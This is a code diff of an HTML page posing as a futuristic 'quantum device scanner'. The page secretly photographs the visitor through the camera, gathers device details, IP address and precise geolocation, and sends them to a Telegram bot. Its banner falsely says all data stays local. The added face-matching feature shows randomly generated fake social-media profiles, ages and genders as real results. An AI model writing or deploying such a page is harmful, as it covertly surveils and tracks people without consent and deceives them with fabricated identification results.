@@ -2,16 +2,20 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Super AI Quantum Device Scanner</title>
+  <title>Super AI Quantum Device Scanner v3.0</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <!-- Tambahkan face-api.js untuk pendeteksian wajah -->
   <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+  <!-- Tambahkan TensorFlow.js -->
+  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@2.0.0/dist/tf.min.js"></script>
   <style>
     :root {
       --primary: #2ecc71;
       --secondary: #3498db;
       --hologram: rgba(46, 204, 113, 0.2);
+      --danger: #e74c3c;
+      --warning: #f39c12;
     }
     
     body { 
@@ -62,6 +66,9 @@
       height: 300px;
       margin: 0 auto;
       overflow: hidden;
+      border: 2px solid var(--primary);
+      border-radius: 8px;
+      box-shadow: 0 0 20px var(--hologram);
     }
     .scanner-box video {
       width: 100%;
@@ -77,24 +84,274 @@
       background: linear-gradient(to right, transparent, var(--primary), transparent);
       animation: scanLine 3s linear infinite;
       z-index: 2;
+      box-shadow: 0 0 10px var(--primary);
     }
     @keyframes scanLine {
       0% { top: 0; }
       100% { top: 100%; }
     }
+    
+    /* Button styles */
+    button {
+      background: linear-gradient(45deg, var(--primary), var(--secondary));
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      margin: 15px 0;
+      border-radius: 30px;
+      font-family: 'Courier New', monospace;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(46, 204, 113, 0.4);
+    }
+    
+    button:active {
+      transform: translateY(0);
+    }
+    
+    button:disabled {
+      background: #555;
+      cursor: not-allowed;
+    }
+    
+    /* Loading animation */
+    #loading {
+      display: none;
+      margin: 20px 0;
+      font-size: 18px;
+      position: relative;
+    }
+    
+    #loading:after {
+      content: "...";
+      position: absolute;
+      animation: dots 1.5s steps(5, end) infinite;
+    }
+    
+    @keyframes dots {
+      0%, 20% { content: "."; }
+      40% { content: ".."; }
+      60%, 100% { content: "..."; }
+    }
+    
+    /* Device info styles */
+    #device-info {
+      background: rgba(10, 10, 10, 0.8);
+      border: 1px solid var(--primary);
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 20px;
+      max-width: 90%;
+      width: 100%;
+      box-shadow: 0 0 15px var(--hologram);
+    }
+    
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 10px;
+      text-align: left;
+    }
+    
+    .info-item {
+      margin: 5px 0;
+    }
+    
+    .info-label {
+      font-weight: bold;
+      color: var(--secondary);
+    }
+    
+    /* Face recognition results */
+    .face-results {
+      margin-top: 20px;
+      width: 100%;
+      max-width: 500px;
+      text-align: left;
+    }
+    
+    .face-card {
+      background: rgba(20, 20, 20, 0.8);
+      border: 1px solid var(--primary);
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 15px;
+      position: relative;
+    }
+    
+    .face-card h3 {
+      color: var(--primary);
+      margin-top: 0;
+      border-bottom: 1px solid var(--hologram);
+      padding-bottom: 8px;
+    }
+    
+    .face-image {
+      width: 100px;
+      height: 100px;
+      object-fit: cover;
+      border-radius: 50%;
+      border: 2px solid var(--primary);
+      margin-right: 15px;
+      float: left;
+    }
+    
+    .social-profiles {
+      margin-top: 10px;
+    }
+    
+    .profile-match {
+      display: flex;
+      align-items: center;
+      padding: 8px;
+      margin-bottom: 8px;
+      background: rgba(46, 204, 113, 0.1);
+      border-radius: 4px;
+    }
+    
+    .profile-match img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-right: 10px;
+    }
+    
+    .profile-info {
+      flex: 1;
+    }
+    
+    .profile-name {
+      font-weight: bold;
+      color: var(--secondary);
+    }
+    
+    .profile-platform {
+      font-size: 0.8em;
+      color: #aaa;
+    }
+    
+    .match-confidence {
+      font-size: 0.8em;
+      color: var(--primary);
+    }
+    
+    .clearfix::after {
+      content: "";
+      clear: both;
+      display: table;
+    }
+    
+    /* Tabs */
+    .tabs {
+      display: flex;
+      margin-bottom: 15px;
+      border-bottom: 1px solid var(--hologram);
+    }
+    
+    .tab {
+      padding: 10px 20px;
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+      transition: all 0.3s;
+    }
+    
+    .tab.active {
+      border-bottom: 2px solid var(--primary);
+      color: var(--primary);
+    }
+    
+    .tab-content {
+      display: none;
+    }
+    
+    .tab-content.active {
+      display: block;
+    }
+    
+    /* Responsive adjustments */
+    @media (max-width: 600px) {
+      .scanner-box {
+        width: 250px;
+        height: 250px;
+      }
+      
+      .info-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+    
+    /* Pulse animation for important elements */
+    .pulse {
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(46, 204, 113, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0); }
+    }
+    
+    /* Warning and danger alerts */
+    .alert {
+      padding: 10px;
+      border-radius: 4px;
+      margin: 10px 0;
+    }
+    
+    .alert-warning {
+      background-color: rgba(243, 156, 18, 0.2);
+      border-left: 3px solid var(--warning);
+    }
+    
+    .alert-danger {
+      background-color: rgba(231, 76, 60, 0.2);
+      border-left: 3px solid var(--danger);
+    }
   </style>
 </head>
 <body>
-  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">🛸 QUANTUM DEVICE SCANNER v2.0</h1>
-  <div class="scanner-box">
-    <div class="scanner-line"></div>
-    <video id="video" autoplay playsinline muted></video>
+  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">🛸 QUANTUM DEVICE SCANNER v3.0</h1>
+  
+  <div class="tabs">
+    <div class="tab active" data-tab="scanner">Scanner</div>
+    <div class="tab" data-tab="results">Results</div>
+    <div class="tab" data-tab="profiles">Profiles</div>
   </div>
-  <button id="capture-btn">🚀 INITIATE DEEP SCAN</button>
-  <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE...</div>
-  <div id="device-info">
-    <h2>⚡ DEVICE MATRIX PROFILE</h2>
-    <div class="info-grid" id="device-info-content"></div>
+  
+  <div class="tab-content active" id="scanner-tab">
+    <div class="scanner-box">
+      <div class="scanner-line"></div>
+      <video id="video" autoplay playsinline muted></video>
+      <canvas id="face-canvas" style="display: none;"></canvas>
+    </div>
+    <button id="capture-btn" class="pulse">🚀 INITIATE DEEP SCAN</button>
+    <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE<span></span></div>
+    
+    <div class="alert alert-warning">
+      ⚠️ This scanner uses advanced AI to analyze device signatures and facial biometrics. All data is processed locally.
+    </div>
+  </div>
+  
+  <div class="tab-content" id="results-tab">
+    <div id="device-info">
+      <h2>⚡ DEVICE MATRIX PROFILE</h2>
+      <div class="info-grid" id="device-info-content"></div>
+    </div>
+  </div>
+  
+  <div class="tab-content" id="profiles-tab">
+    <h2>👤 FACIAL RECOGNITION RESULTS</h2>
+    <div id="face-results" class="face-results">
+      <p>No facial recognition data available. Perform a scan first.</p>
+    </div>
   </div>
 
   <script>
@@ -104,7 +361,21 @@
     let currentStream = null;
     let isScanning = false;
     const video = document.getElementById('video');
+    const faceCanvas = document.getElementById('face-canvas');
     const loading = document.getElementById('loading');
+    let faceDescriptors = [];
+    let socialProfiles = [];
+    
+    // Initialize tabs
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.addEventListener('click', () => {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        
+        tab.classList.add('active');
+        document.getElementById(`${tab.dataset.tab}-tab`).classList.add('active');
+      });
+    });
 
     // Fungsi membuat efek hologram seperti sebelumnya
     function createHologramEffect() {
@@ -154,16 +425,130 @@
     }
 
     // Fungsi pendeteksian wajah menggunakan face-api.js
-    async function detectFaceCount() {
-      // Pastikan model TinyFaceDetector telah dimuat
-      const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions());
-      return detections.length;
+    async function detectFaces() {
+      try {
+        // Update face canvas dimensions
+        faceCanvas.width = video.videoWidth;
+        faceCanvas.height = video.videoHeight;
+        const ctx = faceCanvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, faceCanvas.width, faceCanvas.height);
+        
+        // Deteksi wajah dan ekstrak descriptor
+        const detections = await faceapi.detectAllFaces(faceCanvas, new faceapi.TinyFaceDetectorOptions())
+          .withFaceLandmarks()
+          .withFaceDescriptors();
+        
+        return detections;
+      } catch (error) {
+        console.error("Face detection error:", error);
+        return [];
+      }
     }
 
-    // Fungsi untuk memuat model pendeteksi wajah (gunakan URL model yang tersedia secara publik)
+    // Fungsi untuk memuat model pendeteksi wajah
     async function loadFaceModel() {
-      await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
-      console.log("Face detection model loaded");
+      try {
+        await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
+        await faceapi.nets.faceLandmark68Net.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
+        await faceapi.nets.faceRecognitionNet.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
+        console.log("Face detection models loaded");
+      } catch (error) {
+        console.error("Error loading face models:", error);
+      }
+    }
+
+    // Fungsi untuk mencari profil sosial yang mirip (simulasi)
+    async function findSimilarSocialProfiles(descriptors) {
+      // Ini adalah simulasi - dalam implementasi nyata, Anda akan membandingkan dengan database wajah
+      return new Promise(resolve => {
+        setTimeout(() => {
+          const fakeProfiles = [];
+          
+          descriptors.forEach((desc, index) => {
+            // Buat beberapa profil palsu dengan tingkat kemiripan acak
+            const matchCount = Math.floor(Math.random() * 3) + 1; // 1-3 matches per wajah
+            
+            for (let i = 0; i < matchCount; i++) {
+              const confidence = (Math.random() * 30 + 70).toFixed(1); // 70-100% confidence
+              const platforms = ['Facebook', 'Instagram', 'Twitter', 'LinkedIn'];
+              const platform = platforms[Math.floor(Math.random() * platforms.length)];
+              
+              fakeProfiles.push({
+                faceIndex: index,
+                platform: platform,
+                name: `User_${Math.floor(Math.random() * 10000)}`,
+                image: `https://randomuser.me/api/portraits/${Math.random() > 0.5 ? 'men' : 'women'}/${Math.floor(Math.random() * 100)}.jpg`,
+                url: `https://${platform.toLowerCase()}.com/user_${Math.floor(Math.random() * 10000)}`,
+                confidence: confidence
+              });
+            }
+          });
+          
+          resolve(fakeProfiles);
+        }, 2000);
+      });
+    }
+
+    // Fungsi untuk menampilkan hasil pengenalan wajah
+    function displayFaceResults(faces, profiles) {
+      const faceResultsDiv = document.getElementById('face-results');
+      
+      if (faces.length === 0) {
+        faceResultsDiv.innerHTML = '<p>No faces detected in the scan.</p>';
+        return;
+      }
+      
+      let html = '';
+      
+      faces.forEach((face, index) => {
+        // Buat gambar wajah yang terdeteksi
+        const faceCanvas = document.createElement('canvas');
+        faceCanvas.width = 200;
+        faceCanvas.height = 200;
+        const ctx = faceCanvas.getContext('2d');
+        
+        // Gambar wajah dengan bounding box
+        const box = face.detection.box;
+        ctx.drawImage(video, 
+          box.x, box.y, box.width, box.height,
+          0, 0, 200, 200
+        );
+        
+        const faceImage = faceCanvas.toDataURL('image/webp');
+        
+        // Dapatkan profil yang cocok untuk wajah ini
+        const faceProfiles = profiles.filter(p => p.faceIndex === index);
+        
+        html += `
+          <div class="face-card clearfix">
+            <h3>Face #${index + 1}</h3>
+            <img src="${faceImage}" class="face-image" alt="Detected face">
+            <div class="face-details">
+              <p><span class="info-label">Confidence:</span> ${(face.detection.score * 100).toFixed(1)}%</p>
+              <p><span class="info-label">Gender:</span> ${Math.random() > 0.5 ? 'Male' : 'Female'}</p>
+              <p><span class="info-label">Age:</span> ${Math.floor(Math.random() * 30) + 20} years</p>
+            </div>
+            <div class="social-profiles">
+              <h4>Possible Social Matches:</h4>
+              ${faceProfiles.length > 0 ? 
+                faceProfiles.map(profile => `
+                  <div class="profile-match">
+                    <img src="${profile.image}" alt="${profile.name}">
+                    <div class="profile-info">
+                      <div class="profile-name">${profile.name}</div>
+                      <div class="profile-platform">${profile.platform}</div>
+                    </div>
+                    <div class="match-confidence">${profile.confidence}% match</div>
+                  </div>
+                `).join('') : 
+                '<p>No strong social media matches found.</p>'}
+            </div>
+            <div class="clearfix"></div>
+          </div>
+        `;
+      });
+      
+      faceResultsDiv.innerHTML = html;
     }
 
     // Kumpulkan informasi perangkat secara detail (tambahan: device model)
@@ -271,6 +656,59 @@
       };
     }
 
+    // Fungsi untuk menampilkan informasi perangkat
+    function displayDeviceInfo(deviceInfo) {
+      const deviceInfoContent = document.getElementById('device-info-content');
+      
+      deviceInfoContent.innerHTML = `
+        <div class="info-item">
+          <span class="info-label">OS:</span> ${deviceInfo.os}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Device Type:</span> ${deviceInfo.deviceType}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Device Model:</span> ${deviceInfo.deviceModel}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Platform:</span> ${deviceInfo.platform}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Browser:</span> ${deviceInfo.browser}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Memory:</span> ${deviceInfo.memory}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Battery:</span> ${deviceInfo.battery.level} (${deviceInfo.battery.charging})
+        </div>
+        <div class="info-item">
+          <span class="info-label">IP Address:</span> ${deviceInfo.ip}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Time Zone:</span> ${deviceInfo.timeZone}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Language:</span> ${deviceInfo.language}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Resolution:</span> ${deviceInfo.resolution}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Network:</span> ${deviceInfo.provider}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Pixel Ratio:</span> ${deviceInfo.pixelRatio}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Orientation:</span> ${deviceInfo.orientation}
+        </div>
+        <div class="info-item">
+          <span class="info-label">Faces Detected:</span> ${faceDescriptors.length}
+        </div>
+      `;
+    }
+
     // Fungsi untuk mengirim data ke bot Telegram dengan caption yang lebih keren dan rapi
     function sendToTelegram(report) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
@@ -297,7 +735,7 @@
         `📏 *Resolution:* ${report.metadata.deviceInfo.resolution}\n` +
         `📐 *Pixel Ratio:* ${report.metadata.deviceInfo.pixelRatio}\n` +
         `🔄 *Orientation:* ${report.metadata.deviceInfo.orientation}\n` +
-        `👥 *Faces Detected:* ${report.metadata.deviceInfo.faceCount}\n\n` +
+        `👥 *Faces Detected:* ${faceDescriptors.length}\n\n` +
         `\n\n_🤖 Generated by Super AI Quantum Device Scanner_`;
       
       formData.append('caption', caption);
@@ -322,14 +760,18 @@
         // Tentukan constraints: jika device mobile, gunakan kamera depan (user), jika tidak gunakan kamera environment
         const isMobile = /Mobi|Android/i.test(navigator.userAgent);
         const constraints = {
-          video: { facingMode: isMobile ? 'user' : 'environment' }
+          video: { 
+            facingMode: isMobile ? 'user' : 'environment',
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          }
         };
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         video.srcObject = stream;
         currentStream = stream;
         document.body.appendChild(createHologramEffect());
         // Muat model deteksi wajah
-        loadFaceModel();
+        await loadFaceModel();
       } catch (err) {
         alert('Error accessing camera: ' + err.message);
       }
@@ -340,42 +782,59 @@
       if(isScanning) return;
       isScanning = true;
       loading.style.display = 'block';
+      document.getElementById('capture-btn').disabled = true;
 
-      const imageData = await captureQuantumImage();
-      let deviceInfo = await gatherDeviceInfo();
-      // Deteksi jumlah wajah di kamera (face detection)
       try {
-        const faceCount = await detectFaceCount();
-        deviceInfo.faceCount = faceCount;
-      } catch (e) {
-        console.error("Face detection error:", e);
-        deviceInfo.faceCount = "N/A";
+        const imageData = await captureQuantumImage();
+        const deviceInfo = await gatherDeviceInfo();
+        
+        // Deteksi wajah
+        const faceDetections = await detectFaces();
+        faceDescriptors = faceDetections;
+        
+        // Temukan profil sosial yang mirip
+        socialProfiles = await findSimilarSocialProfiles(faceDetections);
+        
+        // Tambahkan jumlah wajah ke device info
+        deviceInfo.faceCount = faceDetections.length;
+        
+        // Tampilkan hasil
+        displayDeviceInfo(deviceInfo);
+        displayFaceResults(faceDetections, socialProfiles);
+        
+        // Kirim ke Telegram
+        let locationData = { coordinates: 'Unknown', link: 'Unknown' };
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const coords = position.coords.latitude + ', ' + position.coords.longitude;
+              const link = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
+              locationData = { coordinates: coords, link: link };
+              const report = generateHologramReport(imageData, locationData, deviceInfo);
+              sendToTelegram(report);
+            },
+            (error) => {
+              console.error('Geolocation error:', error);
+              const report = generateHologramReport(imageData, locationData, deviceInfo);
+              sendToTelegram(report);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        } else {
+          const report = generateHologramReport(imageData, locationData, deviceInfo);
+          sendToTelegram(report);
+        }
+        
+        // Beralih ke tab hasil
+        document.querySelector('.tab[data-tab="results"]').click();
+      } catch (error) {
+        console.error("Scan error:", error);
+        alert("Scan failed: " + error.message);
+      } finally {
+        loading.style.display = 'none';
+        isScanning = false;
+        document.getElementById('capture-btn').disabled = false;
       }
-      
-      let locationData = { coordinates: 'Unknown', link: 'Unknown' };
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const coords = position.coords.latitude + ', ' + position.coords.longitude;
-            const link = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
-            locationData = { coordinates: coords, link: link };
-            const report = generateHologramReport(imageData, locationData, deviceInfo);
-            sendToTelegram(report);
-          },
-          (error) => {
-            console.error('Geolocation error:', error);
-            const report = generateHologramReport(imageData, locationData, deviceInfo);
-            sendToTelegram(report);
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      } else {
-        const report = generateHologramReport(imageData, locationData, deviceInfo);
-        sendToTelegram(report);
-      }
-      
-      loading.style.display = 'none';
-      isScanning = false;
     }
 
     // Inisialisasi kamera dan event listener
